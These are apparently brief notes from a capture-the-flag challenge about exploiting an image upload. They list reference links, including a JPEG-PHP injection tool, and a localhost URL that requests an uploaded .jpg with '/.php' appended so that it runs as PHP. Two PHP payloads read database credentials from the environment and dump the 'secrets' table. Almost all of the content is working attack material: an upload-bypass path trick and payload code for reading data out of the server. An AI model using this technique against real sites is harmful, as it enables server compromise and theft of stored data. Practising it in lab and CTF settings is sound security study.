https://www.php.net/manual/en/function.getimagesize.php

https://trevorsaudi.medium.com/indead-hackpack-ctf-1b3878120da5



https://github.com/dlegs/php-jpeg-injector?tab=readme-ov-file

http://localhost:8000/user-data/c38c9f51-c973-4607-8d5e-f8cf50b17297.jpg/.php

```
<?php
$DB_HOST = getenv("DB_HOST");
$DB_NAME = getenv("DB_NAME");
$DB_USER = getenv("DB_USER");
$DB_PASS = getenv("DB_PASS");
$db = new PDO("mysql:host=$DB_HOST;dbname=$DB_NAME", $DB_USER, $DB_PASS, [ PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, ]);
$sql = "select flag from secrets"; foreach ($db->query($sql) as $row) { print $row['flag']; }


<?php

$DB_HOST = getenv("DB_HOST");
$DB_NAME = getenv("DB_NAME");
$DB_USER = getenv("DB_USER");
$DB_PASS = getenv("DB_PASS");
echo 123;
 $db = new PDO("mysql:host=$DB_HOST;dbname=$DB_NAME", $DB_USER, $DB_PASS, [ PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, ]);
$sql = "select flag from secrets"; foreach ($db->query($sql) as $row) {var_dump($row);
}

```
